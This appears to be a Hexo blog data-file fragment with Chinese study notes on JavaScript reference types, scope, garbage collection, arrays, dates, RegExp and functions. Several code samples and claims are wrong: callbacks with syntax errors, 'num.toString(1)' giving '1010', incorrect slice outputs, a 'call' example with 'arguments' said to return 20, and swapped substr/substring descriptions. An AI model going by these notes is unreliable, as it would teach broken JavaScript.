plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><p></p><p><img src=\"/nestJs/nest-js-tutorial-2/log.png\" alt=\"logger\"></p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p>处理请求的基本方法就讲到这里，<a href=\"/nestJs/nest-js-tutorial-3/\" title=\"下一篇\">下一篇</a>会讲解如何连接数据库并使用</p>"},{"title":"JavaScript高级程序设计重读---4章","date":"2017-07-11T03:54:31.000Z","dir":"javascript","keywords":"JavaScript高级程序设计","_content":"### 变量、作用域、和内存问题\n#### 引用类型\nJavascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的\n```\nvar obj1 = new Object();\nvar obj2 = obj1;\nobj1.name = 'gdccwxx'\nobj2.name   // gdccwxx\n```\n对象是存在堆中，JavaScript只能引用堆中的Object。如图\n![heap](heapObject.png)\n而由于复制后的两个变量对象都指向堆内存中的一个Object，因此改变一个后，另一个也会随着改变\n##### 函数在对象的传递是按值传递\n```\nunction setName(obj){\n    obj.name = 'gdccwxx'\n    obj = new Object();\n    obj.name = 'guo'\n}\nvar person = new Object();\nsetName(person)\nperson.name     // gdccwxx\n```\n解释：由于传入的person给obj复制了一份引用。因此一开始的时候是obj和person引用的是同一个。而第二段代码中，由于obj改变了新的引用。在改变之前，使person的name发生改变。而之后引用新的Object，因此person.name依然是gdccwxx。在函数执行之后，obj立即被销毁。\n#### 检测类型\n利用typeof检查五个基本类型，而对于对象的类型检测，则采用instanceof\nresult = variable instanceof constructor\n\n```\nperson instanceof Object    //true\npattern instanceof  RegExp  //true\n```\n#### 作用域\n通常来说，一段程序代码中所用到的名字并不总是有效/可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。\n##### 延长作用域\n利用with，以及try-catch语句中可以延长作用域\n##### 没有块级作用域\n```\nif(true){\n    var color = 'blue'\n}\ncolor // blue\nfor(var i = 0;i<10;i++){\n    doSomething(i)\n}\ni // 10\n```\n从上面可以看出，在花括号中是不算作用域的。因此，在es5的下是没有块级作用域的\n#### 垃圾收集\nJavaScript是具有自动手机垃圾的机制的\n##### 标记清除\n当变量进入环境时(如在函数声明一个变量时)九江变量标记位’进入环境’。从逻辑上讲，永远不能释放进入环境变量所占用的内存。当变量离开环境时，则将其标记为’离开环境‘\n##### 引用计数\n引用一次，引用次数+1，引用另外一个值，引用-1，当到达0时，将其清除。\nBug：循环引用时，导致无法清除。多个引用存在时，导致内存消耗而崩溃。\n#### 性能问题\nIE6使用内存分配，就是256个变量，4096个对象(或数组)字面量和数组元素或者64KB字符串执行自动清理。由于频繁清理，导致严重性能问题\nIE7的垃圾收集机制，初始值和IE6相等，如果垃圾手机里程回收的内存分配量低于15%，则变量、字面量和数组元素的临界值就会翻倍。如果历程回收了85%，则重回默认值\n#### 内存管理\n位确保占用最少的内存可以让页面获得更好的性能，优化内存的最佳方式。就是位执行的代码只保存必要的数据。一旦数据不在游泳，最好通过其值设为null来释放其引用。这叫接触引用。\n#### 小结 \n通过本章的学习，让我更理解了js这门语言的垃圾清理以及变量问题。采用简单的思路可以解决更好的问题。今后的coding会采用更简单，更高效的使用方法去解决问题","source":"_posts/read-javascript-again-chapter4.md","raw":"---\ntitle: JavaScript高级程序设计重读---4章\ndate: 2017-07-11 11:54:31\ntags: javascript\ndir: javascript\nkeywords: JavaScript高级程序设计\n---\n### 变量、作用域、和内存问题\n#### 引用类型\nJavascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的\n```\nvar obj1 = new Object();\nvar obj2 = obj1;\nobj1.name = 'gdccwxx'\nobj2.name   // gdccwxx\n```\n对象是存在堆中，JavaScript只能引用堆中的Object。如图\n![heap](heapObject.png)\n而由于复制后的两个变量对象都指向堆内存中的一个Object，因此改变一个后，另一个也会随着改变\n##### 函数在对象的传递是按值传递\n```\nunction setName(obj){\n    obj.name = 'gdccwxx'\n    obj = new Object();\n    obj.name = 'guo'\n}\nvar person = new Object();\nsetName(person)\nperson.name     // gdccwxx\n```\n解释：由于传入的person给obj复制了一份引用。因此一开始的时候是obj和person引用的是同一个。而第二段代码中，由于obj改变了新的引用。在改变之前，使person的name发生改变。而之后引用新的Object，因此person.name依然是gdccwxx。在函数执行之后，obj立即被销毁。\n#### 检测类型\n利用typeof检查五个基本类型，而对于对象的类型检测，则采用instanceof\nresult = variable instanceof constructor\n\n```\nperson instanceof Object    //true\npattern instanceof  RegExp  //true\n```\n#### 作用域\n通常来说，一段程序代码中所用到的名字并不总是有效/可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。\n##### 延长作用域\n利用with，以及try-catch语句中可以延长作用域\n##### 没有块级作用域\n```\nif(true){\n    var color = 'blue'\n}\ncolor // blue\nfor(var i = 0;i<10;i++){\n    doSomething(i)\n}\ni // 10\n```\n从上面可以看出，在花括号中是不算作用域的。因此，在es5的下是没有块级作用域的\n#### 垃圾收集\nJavaScript是具有自动手机垃圾的机制的\n##### 标记清除\n当变量进入环境时(如在函数声明一个变量时)九江变量标记位’进入环境’。从逻辑上讲，永远不能释放进入环境变量所占用的内存。当变量离开环境时，则将其标记为’离开环境‘\n##### 引用计数\n引用一次，引用次数+1，引用另外一个值，引用-1，当到达0时，将其清除。\nBug：循环引用时，导致无法清除。多个引用存在时，导致内存消耗而崩溃。\n#### 性能问题\nIE6使用内存分配，就是256个变量，4096个对象(或数组)字面量和数组元素或者64KB字符串执行自动清理。由于频繁清理，导致严重性能问题\nIE7的垃圾收集机制，初始值和IE6相等，如果垃圾手机里程回收的内存分配量低于15%，则变量、字面量和数组元素的临界值就会翻倍。如果历程回收了85%，则重回默认值\n#### 内存管理\n位确保占用最少的内存可以让页面获得更好的性能，优化内存的最佳方式。就是位执行的代码只保存必要的数据。一旦数据不在游泳，最好通过其值设为null来释放其引用。这叫接触引用。\n#### 小结 \n通过本章的学习，让我更理解了js这门语言的垃圾清理以及变量问题。采用简单的思路可以解决更好的问题。今后的coding会采用更简单，更高效的使用方法去解决问题","slug":"read-javascript-again-chapter4","published":1,"updated":"2021-10-13T15:52:11.634Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0700114jzxz6x0cwsw","content":"<h3 id=\"变量、作用域、和内存问题\"><a href=\"#变量、作用域、和内存问题\" class=\"headerlink\" title=\"变量、作用域、和内存问题\"></a>变量、作用域、和内存问题</h3><h4 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h4><p>Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj1 = new Object();</span><br><span class=\"line\">var obj2 = obj1;</span><br><span class=\"line\">obj1.name = &apos;gdccwxx&apos;</span><br><span class=\"line\">obj2.name   // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>对象是存在堆中，JavaScript只能引用堆中的Object。如图<br><img src=\"/img/loading.gif\" data-original=\"/javascript/read-javascript-again-chapter4/heapObject.png\" alt=\"heap\"><br>而由于复制后的两个变量对象都指向堆内存中的一个Object，因此改变一个后，另一个也会随着改变</p><h5 id=\"函数在对象的传递是按值传递\"><a href=\"#函数在对象的传递是按值传递\" class=\"headerlink\" title=\"函数在对象的传递是按值传递\"></a>函数在对象的传递是按值传递</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unction setName(obj)&#123;</span><br><span class=\"line\">    obj.name = &apos;gdccwxx&apos;</span><br><span class=\"line\">    obj = new Object();</span><br><span class=\"line\">    obj.name = &apos;guo&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person = new Object();</span><br><span class=\"line\">setName(person)</span><br><span class=\"line\">person.name     // gdccwxx</span><br></pre></td></tr></table></figure><p>解释：由于传入的person给obj复制了一份引用。因此一开始的时候是obj和person引用的是同一个。而第二段代码中，由于obj改变了新的引用。在改变之前，使person的name发生改变。而之后引用新的Object，因此person.name依然是gdccwxx。在函数执行之后，obj立即被销毁。</p><h4 id=\"检测类型\"><a href=\"#检测类型\" class=\"headerlink\" title=\"检测类型\"></a>检测类型</h4><p>利用typeof检查五个基本类型，而对于对象的类型检测，则采用instanceof<br>result = variable instanceof constructor</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">person instanceof Object    //true</span><br><span class=\"line\">pattern instanceof  RegExp  //true</span><br></pre></td></tr></table></figure><h4 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h4><p>通常来说，一段程序代码中所用到的名字并不总是有效/可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。</p><h5 id=\"延长作用域\"><a href=\"#延长作用域\" class=\"headerlink\" title=\"延长作用域\"></a>延长作用域</h5><p>利用with，以及try-catch语句中可以延长作用域</p><h5 id=\"没有块级作用域\"><a href=\"#没有块级作用域\" class=\"headerlink\" title=\"没有块级作用域\"></a>没有块级作用域</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(true)&#123;</span><br><span class=\"line\">    var color = &apos;blue&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">color // blue</span><br><span class=\"line\">for(var i = 0;i&lt;10;i++)&#123;</span><br><span class=\"line\">    doSomething(i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">i // 10</span><br></pre></td></tr></table></figure><p>从上面可以看出，在花括号中是不算作用域的。因此，在es5的下是没有块级作用域的</p><h4 id=\"垃圾收集\"><a href=\"#垃圾收集\" class=\"headerlink\" title=\"垃圾收集\"></a>垃圾收集</h4><p>JavaScript是具有自动手机垃圾的机制的</p><h5 id=\"标记清除\"><a href=\"#标记清除\" class=\"headerlink\" title=\"标记清除\"></a>标记清除</h5><p>当变量进入环境时(如在函数声明一个变量时)九江变量标记位’进入环境’。从逻辑上讲，永远不能释放进入环境变量所占用的内存。当变量离开环境时，则将其标记为’离开环境‘</p><h5 id=\"引用计数\"><a href=\"#引用计数\" class=\"headerlink\" title=\"引用计数\"></a>引用计数</h5><p>引用一次，引用次数+1，引用另外一个值，引用-1，当到达0时，将其清除。<br>Bug：循环引用时，导致无法清除。多个引用存在时，导致内存消耗而崩溃。</p><h4 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h4><p>IE6使用内存分配，就是256个变量，4096个对象(或数组)字面量和数组元素或者64KB字符串执行自动清理。由于频繁清理，导致严重性能问题<br>IE7的垃圾收集机制，初始值和IE6相等，如果垃圾手机里程回收的内存分配量低于15%，则变量、字面量和数组元素的临界值就会翻倍。如果历程回收了85%，则重回默认值</p><h4 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h4><p>位确保占用最少的内存可以让页面获得更好的性能，优化内存的最佳方式。就是位执行的代码只保存必要的数据。一旦数据不在游泳，最好通过其值设为null来释放其引用。这叫接触引用。</p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章的学习，让我更理解了js这门语言的垃圾清理以及变量问题。采用简单的思路可以解决更好的问题。今后的coding会采用更简单，更高效的使用方法去解决问题</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"变量、作用域、和内存问题\"><a href=\"#变量、作用域、和内存问题\" class=\"headerlink\" title=\"变量、作用域、和内存问题\"></a>变量、作用域、和内存问题</h3><h4 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h4><p>Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj1 = new Object();</span><br><span class=\"line\">var obj2 = obj1;</span><br><span class=\"line\">obj1.name = &apos;gdccwxx&apos;</span><br><span class=\"line\">obj2.name   // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>对象是存在堆中，JavaScript只能引用堆中的Object。如图<br><img src=\"/javascript/read-javascript-again-chapter4/heapObject.png\" alt=\"heap\"><br>而由于复制后的两个变量对象都指向堆内存中的一个Object，因此改变一个后，另一个也会随着改变</p><h5 id=\"函数在对象的传递是按值传递\"><a href=\"#函数在对象的传递是按值传递\" class=\"headerlink\" title=\"函数在对象的传递是按值传递\"></a>函数在对象的传递是按值传递</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unction setName(obj)&#123;</span><br><span class=\"line\">    obj.name = &apos;gdccwxx&apos;</span><br><span class=\"line\">    obj = new Object();</span><br><span class=\"line\">    obj.name = &apos;guo&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person = new Object();</span><br><span class=\"line\">setName(person)</span><br><span class=\"line\">person.name     // gdccwxx</span><br></pre></td></tr></table></figure><p>解释：由于传入的person给obj复制了一份引用。因此一开始的时候是obj和person引用的是同一个。而第二段代码中，由于obj改变了新的引用。在改变之前，使person的name发生改变。而之后引用新的Object，因此person.name依然是gdccwxx。在函数执行之后，obj立即被销毁。</p><h4 id=\"检测类型\"><a href=\"#检测类型\" class=\"headerlink\" title=\"检测类型\"></a>检测类型</h4><p>利用typeof检查五个基本类型，而对于对象的类型检测，则采用instanceof<br>result = variable instanceof constructor</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">person instanceof Object    //true</span><br><span class=\"line\">pattern instanceof  RegExp  //true</span><br></pre></td></tr></table></figure><h4 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h4><p>通常来说，一段程序代码中所用到的名字并不总是有效/可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。</p><h5 id=\"延长作用域\"><a href=\"#延长作用域\" class=\"headerlink\" title=\"延长作用域\"></a>延长作用域</h5><p>利用with，以及try-catch语句中可以延长作用域</p><h5 id=\"没有块级作用域\"><a href=\"#没有块级作用域\" class=\"headerlink\" title=\"没有块级作用域\"></a>没有块级作用域</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(true)&#123;</span><br><span class=\"line\">    var color = &apos;blue&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">color // blue</span><br><span class=\"line\">for(var i = 0;i&lt;10;i++)&#123;</span><br><span class=\"line\">    doSomething(i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">i // 10</span><br></pre></td></tr></table></figure><p>从上面可以看出，在花括号中是不算作用域的。因此，在es5的下是没有块级作用域的</p><h4 id=\"垃圾收集\"><a href=\"#垃圾收集\" class=\"headerlink\" title=\"垃圾收集\"></a>垃圾收集</h4><p>JavaScript是具有自动手机垃圾的机制的</p><h5 id=\"标记清除\"><a href=\"#标记清除\" class=\"headerlink\" title=\"标记清除\"></a>标记清除</h5><p>当变量进入环境时(如在函数声明一个变量时)九江变量标记位’进入环境’。从逻辑上讲，永远不能释放进入环境变量所占用的内存。当变量离开环境时，则将其标记为’离开环境‘</p><h5 id=\"引用计数\"><a href=\"#引用计数\" class=\"headerlink\" title=\"引用计数\"></a>引用计数</h5><p>引用一次，引用次数+1，引用另外一个值，引用-1，当到达0时，将其清除。<br>Bug：循环引用时，导致无法清除。多个引用存在时，导致内存消耗而崩溃。</p><h4 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h4><p>IE6使用内存分配，就是256个变量，4096个对象(或数组)字面量和数组元素或者64KB字符串执行自动清理。由于频繁清理，导致严重性能问题<br>IE7的垃圾收集机制，初始值和IE6相等，如果垃圾手机里程回收的内存分配量低于15%，则变量、字面量和数组元素的临界值就会翻倍。如果历程回收了85%，则重回默认值</p><h4 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h4><p>位确保占用最少的内存可以让页面获得更好的性能，优化内存的最佳方式。就是位执行的代码只保存必要的数据。一旦数据不在游泳，最好通过其值设为null来释放其引用。这叫接触引用。</p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章的学习，让我更理解了js这门语言的垃圾清理以及变量问题。采用简单的思路可以解决更好的问题。今后的coding会采用更简单，更高效的使用方法去解决问题</p>"},{"title":"JavaScript高级程序设计重读---5章","date":"2017-07-12T04:01:33.000Z","dir":"javascript","keywords":"JavaScript高级程序设计","_content":"### 引用类型\n#### Object类型\n1、JavaScript会将对象的属性自动转换成字符串\n```\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29,\n    5:true\n}\n全等于\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29,\n    \"5\": true\n}\n```\n_ps:最后一个属性后面是不添加逗号的，如果添加，在IE7即更早之前版本和Opera出现错误_\n\n2、两种访问对象的方法。\n\n(1)在对象后面使用.来访问对象的属性\n(2)使用['']来访问对象的属性\n```\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29\n}\nperson.name         // gdccwxx\nperson['name']      // gdccwxx\n```\n第二种方法有好处，在对象的属性有空格的时候，只能用第二种\n#### Array类型\n数组是一组按序排列的值，相对地，对象的属性名称是无序的。从本质上讲，数组是按次序排列的一组值，数组是一种特殊的对象。\n```\nvar arr = ['a', 'b', 'c'];\nObject.keys(arr);// [\"0\", \"1\", \"2\"]\n```\nJavaScript的数据类型分为：值类型和引用类型(地址值)；而常见的引用类型有Object和Array／数组的存储模型中，如果是诸如Number,String之类的类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引（即C中所说的保存了数据的指针）。这些数据时储存在堆中的某块区间中，堆栈并不是独立的，栈中也可以在堆中存放。\n##### 数组的创建\nvar arrayObj = new Array();　//创建一个数组\nvar arrayObj = new Array(size);　//创建一个数组并指定长度，注意不是上限，是长度\nvar arrayObj = new Array([element0[, element1[, ...[, elementN]]]]);　//创建一个数组并赋值\nvar arrayObj = []\n##### 数组的检测\nvalue instanceof Array  // true or false\nArray.isArray(value)    // true or false\n##### 转换方法\n调用Array.prototype.toString()方法，将Array转换成字符串\n##### 数组的几种操作方法\n\n| 方法 | 解释 |\n|---|---|\n|shift |获取数组的第一项并返回，减少数组的length值|\n|unshift |在数组前端添加任意个项并返回新数组的长度|\n|pop |从数组某位移除最后一项，减少数组的length值|\n|push |接受任意个参数，把他们逐个添加到数组末尾，病返回修改后数组的长度|\n|reverse |不接受参数，将数组项的顺序翻转|\n|sort |调用每个数组项的toString()转型方法，然后比较的到字符串，已确定如何重排，其返回值和reverse都是排序后的数组|\n|concat |创建一个数组副本，将参数添加到副本之后。接受一个或多个参数，返回连接后的数组|\n|slice |接受一个或两个参数，即要返回项的起始位置和结束位置，只有一个参数返回从指定位置到末尾项所有元项|\n|splice |(1)删除：指定两个参数，要删除的第一项的位置和要删除的项数(2)插入：指定三个参数，起始位置，0(要删除的项数)和要插入的个项。如果要插入多项，则传入多个参数(3)替换：指定三个参数：起始位置、要删除的项数和要插入的任一项。插入和删除的项数不必相等|\n|indexOf |从数组的开头位置(0)开始向后查找，没找到返回-1|\n|lastIndexOf |从数组的最后位置(length-1)开始向前查找，没找到返回-1|\n|every |对数组的每一项都运行给定函数，如果该数组的每一项都返回true，则返回true|\n|filiter |对数组的每一项运行给定函数，返回该函数会返回true的项组成的数组|\n|forEach |对数组的每一项运行给定的函数，这个方法没有返回值|\n|map |对数组的每一项运行给定函数，返回每次函数调用的结果组成的数组|\n|some |对数组中的每一项运行给定函数，任意一项返回true，则返回true|\n|reduce |从数组的第一项开始，逐个遍历到最后|\n|reduceRight |从数组的最后一项开始，逐个遍历到第一个|\n\n```\nvar color = ['red','green']\n// shift\nvar item1 = color.shift()\nitem1       // 'red'   color = ['green']   color.length = 1\n// unshift\nvar item2 = color.unshift('red','blue')\nitem2       // 3    color = ['red','blue','green']\n// pop \nvar item3 = color.pop()\nitem3       // green    color=['red','blue'] color.length = 2\n// push\nvar item4 = color.push('gray')\nitem4       // 3    color = ['red','blue','gray']   color.length = 3\n// reverse\ncolor.reverse() //color = ['gray','blue','red']\n// sort\nfunction compare(value1,value2){\n    if(value1 < value2){\n        return 1;\n    }else if(value1 > value2){\n        return -1\n    }else {\n        return 0\n    }\n}\ncolor.sort(compare)     //[\"red\", \"gray\", \"blue\"]\n// concat\nvar color2 = color.concat('red')\ncolor2      //[\"red\", \"gray\", \"blue\", \"red\"]\n// slice\nvar removed1 = color.slice(1)\nvar removed2 = color.slice(1,3)\nremoved1    // \"gray,blue,red\"\nremoved2    // \"gray,blue\"\n// splice\nvar removed3 = color.splice(0,1)    // 删除第一项\nremoved3    // 'red'\nvar removed4 = color.splice(1,0,'origin','pink')    // 从位置1插入两项\nremoved4    // 'red,origin,pink,gray,blue,red'\nvar removed5 = color.splice(1,1,'purple')           // 插入一项，删除一项\nremoved5    // 'red,purple,blue,red'\n// indexOf\nvar item10 = color.indexOf('blue')\nitem10      // 2\n// lastIndexOf\nvar item11 = color.indexOf('red')\nitem11      // 3\n// every\nvar item12 = color.every(function(item, index, array)){     //参数为item，迭代到的元素\n    return item == 'red'            // index,索引，array，数组本身\n}\nitem12      // false\n// filiter \nvar item13 = color.filiter(function(item,index,array)){\n    return (item == 'red')\n}\nitem13      // red,red\n// forEach \ncolor.forEach(function(item,index,array)){\n    //执行某些操作\n}\n// map\nvar item15 = color.map(function(item,index,array)){\n    return ('color is ' +item)\n}\nitem15      // [\"color is red\", \"color is gray\", \"color is blue\", \"color is red\"]\n// some\nvar item16 = color.some(function(item, index, array)){     //参数为item，迭代到的元素\n    return item == 'red'            // index,索引，array，数组本身\n}\nitem16      // true\n// reduce()\nvar item17 = color.reduce(function(prev,cur,index,array)){\n    return (prev + ' + ' cur)\n}\nitem17      // \"red + gray + blue + red\"\nvar item18 = color.reduceRight(function(prev,cur,index,array)){\n    return (prev + ' + ' cur)\n}\nitem18      // \"red + blue + gray + red\"\n\n```\n#### Date类型\n从国际时间1970年1月1日零时开始，可以精确到之后的100 000 000年\n##### toString,toLocaleString\n```\nvar date = new Date()\ndate\nWed Jul 12 2017 15:39:22 GMT+0800 (CST)\ndate.toLocaleString()\n\"7/12/2017, 3:39:22 PM\"\ndate.toString()\n\"Wed Jul 12 2017 15:39:22 GMT+0800 (CST)\"\n\n```\n如果是toString()，会直接返回标准的格式；\n如果是toLocaleString()，先判断是否指定语言环境（locale），指定的话则返回当前语言环境下的格式设置（options）的格式化字符串；没有指定语言环境（locale），则返回一个使用默认语言环境和格式设置（options）的格式化字符串。\n##### 日期格式的方法\n| 方法 | 解释 |\n|---|---|\n|toDateString |特定显示的格式显示星期几，月，日，年|\n|toTimeString |显示时，分，秒|\n|toLocalDateString |显示地区的星期几，月，日，年|\n|toLocalTimeString |显示地区的时，分，秒|\n|toUTCString |显示完整格式的UTC日期|\n|toLocaleString |区别如上|\n|toString |区别如上|\n\n```\nvar date = new Date()\ndate.toDateString()\n\"Wed Jul 12 2017\"\ndate.toTimeString()\n\"15:49:48 GMT+0800 (CST)\"\ndate.toLocaleDateString()\n\"7/12/2017\"\ndate.toLocaleTimeString()\n\"3:49:48 PM\"\ndate.toUTCString()\n\"Wed, 12 Jul 2017 07:49:48 GMT\"\n\n```\n\n#### RegExp类型\n##### 实例属性\n\n| 方法 | 解释 |\n|---|---|\n|global |布尔值，表示是否设置了g|\n|ignoreCase |布尔值，表示是否设置了i|\n|lastIndex |整数，表示开始搜索下一个匹配的字符标志，从0算起|\n|multiline |布尔值，表示是否设置了m标志|\n|sorce |正则表达式的字符串表示|\n##### 实例方法\nexec —接受一个参数，即要应用模式的字符串，然后返回包含一个匹配信息的数组，或者没有匹配返回null\ntest —接受一个字符串参数，在该模式下匹配成功返回true，否则返回false(只要存在即返回true)\n```\nvar text = 'cat, bat, sat, fat'\nvar pattern = /.at/;\nvar matches = pattern.exec(text)    \nmatches[0]      //cat\nmatches.index   // 0\nvar text = \"456000-00-000123\"\nvar pattern = /\\d{3}-\\d{2}-\\d{2}/\npattern.test(text)      // true\n\n```\n#### Function类型\n每个函数都是Function类型的实例，而且都有与其他引用类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数的指针，不会与某个函数绑定。\n既然函数名是一个指针，所以JavaScript没有重载。\n**ps：访问函数指针时，应该不加圆括号**\n##### 函数表达式和函数声明\n由于JavaScript中有函数声明解析器，在所有函数执行前，会将函数声明提升至顶端。因此，函数表达式和函数声明会有一些区别\n```\nsum1(10,11)     //21\nfunction sum1(num1,num2){\n    return num1+num2\n}\nsum2(10,12) //Uncaught TypeError: sum2 is not a function\nvar sum2 = function (num1,num2){\n    return num1+num2\n}\n```\n其他无明显差别\n##### callee caller\ncallee被调用者\ncaller调用者\nmdn不建议使用\n##### 函数的属性和方法\n```\nfunction F1(a,b){\n    //\n}\nfunction F2(){\n    //\n}\nF1.length // 2\nF2.length // 0\n```\n函数的length属性代表参数的个数\n##### call与apply\n```\nfunction sum(num1,num2){\n    return num1+num2\n}\nfunction callSum(num1, num2){\n    return sum.call(this,num1,num2)\n}\ncallSum(10,10)  //20\nfunction sum(num1,num2){\n    return num1+num2\n}\nfunction callSum(num1, num2){\n    return sum.call(this,arguments)\n}\ncallSum(10,10)  //20\n```\ncall和apply是两个非继承而来的方法，apply接受两个参数，一个是运行时函数的作用域，另一个是arguments对象或array实例；而call方法第一个参数是运行时函数作用域，其他参数是传入字面量。必须逐个列举出来\n```\nwindow.color = 'red'\nvar o = {\n    color:'green'\n}\nfunction sayCOlor(){\n    console.log(this.color)\n}\nsayCOlor.call(this)     //red\nsayCOlor.call(window)   //red\nsayCOlor.call(o)        //green\n```\ncall,apply的最大好处是让其扩充作用域，且实现松耦合\n\nbind是创建一个实例，其this值会被绑定到传给bind函数的值\n```\nwindow.color = 'red'\nvar o = {\n    color : 'blue'\n}\nfunction sayColor(){\n    console.log(this.color)\n}\nvar objectSayColor = sayColor.bind(o)\nobjectSayColor()    //blue\n```\n\n#### 基本包装类型\n##### Boolean类型\n```\nvar falseObject = new Boolean(false)\nvar result = falseObject  && true\nresult // true\nvar falseValue = false\nresult = falseValue && true\nresult // false\ntypeof falseObject  // object\ntypeof falseValue   // boolean\nfalseObject instanceof Boolean  //true\nfalseValue instanceof Boolean   //false\n\n```\n基本类型布尔值与Boolean对象有一定差别，书上建议永远不要使用Boolean对象\n##### Number类型\n```\nvar numberObject = new Number(10)\nnumberObject    // Number {[[PrimitiveValue]]: 10}\nnumberObject.toString() // \"10\"\nnumberObject.valueOf()  // 10\n```\nNumber类型重写了valueOf(),toLocaleString(),toString()，重写后，valueOf返回基本类型值\n基本类型的几个方法\n\n1、toFixed // 有一个参数，代表保留几位小数\n2、toExponential // 指数表示法，表示制定输出结果中小数位数\n3、toPrecision // 接受一个参数，合理的调用toFixed和toExponential\n4、toString // 接受一个参数，代表转换成几进制\n```\nvar num = 10\nnum.toString()  //10\nnum.toString(1)  //1010\nnum.toFixed(2)  //10.00\nnum.toExponential(1)  //1.0e+1\nvar nums = 99\nnum.toPrecision(1)  //1e+2\nnum.toPrecision(2)  // 99\nnum.toPrecision(3)  // 99.0\n\n```\n##### String类型\n1、字符方法\ncharAt —以单个字符串的形式返回给定位置的字符\ncharCodeAt —以单个字符串的形式返回给定位置的字符编码\n```\nvar stringValue = 'hello world'\nstringValue.charAt(1)       // e\nstringValue.charCodeAt(1)   // 101\n```\n2、字符串方法\nslice —接受两个参数，第一个是指定位置，第二个位结束位置，为负数从后往前切取\nsubstr —接受两个参数，第一个是指定位置，第二个是结束位置，为负数从0往后开始\nsubstring —接受两个参数，第一个是指定位置，第二个是字符个数，为负数从后往前切取\n3、字符串位置\nindexOf 